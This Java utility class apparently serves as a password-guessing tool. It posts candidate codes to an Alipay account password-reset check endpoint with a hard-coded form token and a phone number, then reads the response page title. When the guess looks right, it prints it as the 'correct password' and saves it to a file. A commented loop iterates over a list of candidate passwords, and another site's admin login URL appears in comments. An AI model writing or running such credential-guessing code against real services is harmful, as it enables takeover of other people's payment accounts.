package net.shenzhou.util;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

import org.apache.commons.httpclient.Header;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.methods.PostMethod;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

public class TestUtil {
	

	      public static final String GET_URL = " http://localhost:8080/welcome1 ";  
	    
	      public static final String POST_URL = " http://app2.haokanghu.cn/admin/hkh_logn.jsp ";  
		    
//	      public static final String POST_URL = " http://www.court.gov.cn/zgcpwsw/List/ListContent ";  
	    
	      
	     
	   public static void ReadFromPost(String J_mobile,String checkCode) throws IOException{
		// TODO Auto-generated method stub
		   HttpClient httpClient = new HttpClient();
//		   public static final String POST_URL = " http://app2.haokanghu.cn/admin/hkh_logn.jsp ";  
		   String url = "https://accounts.alipay.com:443/console/checkStrategy.htm?sp=1-resetQueryPwd-fullpage";
		   PostMethod postMethod = new PostMethod(url);
		 //   填入各个表单域的值
		  
	    	String _form_token = "2efafa7eb373e20d5d3913c4afaea4878110c40033cf406ea06a9be9fb329571GZ00";
	    	String ua = "099#KAFEjGE5E9EE6YTLEEEEE6twScRqZ603SXyMZ6gqZcu6V6fTDOBYV6DcDcwM8MAwSXJqgMD3gucmNMzwgR9IC6oiSXiY4xqTETiL/3iS1FkVspJLY9pjAM3fY68O8LoTET9LrM1T+9lP/1sUzcgV/Ma3vbryWMDVnwoTET9LrMW3J9lP/FsUzcgVS0s0vtpmuKHVnwoTET9LrBTAZ3lP/hsUzcgVS0s0vtpmuKHVnK5TEEiP/3BGJGFET6i5EE1lE7EFL2xhGW4TEHI1cOYEjr7WoZjDB0ANtkj2qLmBiZWsM8VN0Hk57z0ryJHr8DNNUxg4kLK6mCRVoaSSqFnqKW6r2h5YwqVUPJK4IwpcvhWgfJ6/IHvkcQYtI4Y+gGFEefj2EI/qaWw7zVZBNdZ6bteWNweGL5eDZ/e0Ps0twyJoPPqVNdZ6bteWNw5SaGZQgW9BPzQp3rkJrV50h3VlubngDjCo/slvS3ORHACuxO9js6Uye7BwNuJCNKQWLosCYRJmPw4R+ewDgbeX6ql3z69AGVe0E//8Su2Y4gvl3zRNUt7BcYe6PPXsNyhnw9/8Su2Y6wO3aeXfutxsrQdtUqhsZy1n3MesD/rPE7EUsyaSt3/sHiaP/36alllrcXZddn3llu8FsyaaolllW2aP/36alllzOpdTEEy//3ynScEfE7EIsyaDNBa5nh7JE7EhsynSt3llz7FET6imEEEnE7EKsyNO2+wlsyCz6GFEHXhVMhHUluZd+92OuqZT8fkcuz/zbybTEEaPrxIYjYiP/cZlbRE9E7EFD67EEwoTETJNrHNML/lPN2OxNdLEXMc6NaoTETJNrhHYA/lPN2JxNdLEXMc6NG==";
	    			NameValuePair[] data = {
//		     new NameValuePair("J-mobile", J_mobile),
		     new NameValuePair("checkCode", checkCode),
		     new NameValuePair("_form_token", _form_token)
//		     new NameValuePair("ua", ua)
		   };
		 //   将表单的值放入postMethod中
		   postMethod.setRequestBody(data);
		 //   执行postMethod
		   int statusCode = 0;
		   try {
		    statusCode = httpClient.executeMethod(postMethod);
		   } catch (HttpException e) {
		    // TODO Auto-generated catch block
		    e.printStackTrace();
		   } catch (IOException e) {
		    // TODO Auto-generated catch block
		    e.printStackTrace();
		   }
		 //   HttpClient对于要求接受后继服务的请求，象POST和PUT等不能自动处理转发
		 //   301或者302
		   if (statusCode == HttpStatus.SC_MOVED_PERMANENTLY || statusCode == HttpStatus.SC_MOVED_TEMPORARILY)
		   {
		    //   从头中取出转向的地址
		    Header locationHeader = postMethod.getResponseHeader("location");
		    String location = null;
		    if (locationHeader != null) {
		     location = locationHeader.getValue();
//		     System.out.println("The page was redirected to:" + location);
		    }
		    else {
		     System.err.println("Location field value is null.");
		    }
		    return;
		   }
		   else
		   {
//		          System.out.println(postMethod.getStatusLine());
		          String str = "";
		          try {
		                str = postMethod.getResponseBodyAsString();
		          } catch (IOException e) {
		                // TODO Auto-generated catch block
		                e.printStackTrace();
		          }        
		          System.out.println("<<<<<<"+str+">>>>>");
		          
		       // 解析源代码
		  		Document document = Jsoup.parse(str);

		  		Elements element = (Elements) document.getElementsByTag("title");
		  		String title = element.html();
//		  		System.out.println(enPassword);
//		  		System.out.println(title);
		  		if (title.equals("页面跳转中")) {
					System.out.println("正确密码为:"+checkCode);
//		           /* 写入Txt文件 */  
			           File writename = new File("D:\\zidian\\zhengque\\1.txt"); // 相对路径，如果没有则要建立一个新的output。txt文件  
			           writename.createNewFile(); // 创建新文件  
			           BufferedWriter out = new BufferedWriter(new FileWriter(writename));  
			           out.write("正确密码:"+checkCode); // \r\n即为换行  
			           out.flush(); // 把缓存区内容压入文件  
			           out.close(); // 最后记得关闭文件  
				}
		  		
		          
		          
		   }
		   postMethod.releaseConnection();
		         return ;
		  }
	   
	  
	   
	   
	   
	     /** */  
	     /** 
      * @param args 
	     * @throws IOException 
	      */  
	     public static void main(String[] args) throws IOException {  
	         //readContentFromGet();  
	    	 //readContentFromPost();  
	    	 String username = "15935962724";
		     String enPassword = "111111";
		     ReadFromPost(username,enPassword);  
//		     ReadFromPost(username,enPassword); 
//		     String[] contents = new String []{"zhugesima123","111111"};//content
//			for (String string : contents) {
//				ReadFromPost(username,stirng);  
//			}
//			 

			 
			 
	     }  
	   
	
}
